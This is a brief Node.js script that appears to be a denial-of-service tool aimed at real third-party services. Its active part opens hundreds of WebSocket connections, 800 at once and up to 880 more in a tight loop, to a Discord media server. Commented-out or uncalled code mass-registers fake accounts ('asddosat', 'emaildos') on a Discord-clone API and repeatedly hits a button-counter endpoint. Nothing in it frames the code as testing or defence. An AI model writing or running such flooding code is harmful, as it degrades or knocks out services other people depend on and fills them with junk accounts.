const http = require('http');
const server = http.createServer((req , res) => res.end('asd'))
server.listen(process.env.PORT)
const axios = require('axios')
const WebSocket = require('ws');
//setInterval(() => axios.get('https://dadlaughbutton.com/increment.php'))

i=0

async function makePostRequest() {

    params = {
        "user[username]" : "asddosat"+i,
        "user[email]": "emaildos"+i+"@xyz.com",
        "user[password]" : "123456"
      }

    let res = await axios.post('https://discord-clone.herokuapp.com/api/user', params);

    i++
}


//setInterval(make)

const wss = []

let wsCount = 0;
setInterval(() => {
    
    if(wsCount < 880){
        const ws = new WebSocket('wss://eu-central7445.discord.media');
        wss.push(ws)
        wsCount++
        
    }
})

for(let i = 0; i<800; i++){
    const ws = new WebSocket('wss://eu-central7445.discord.media');
    wss.push(ws)
}
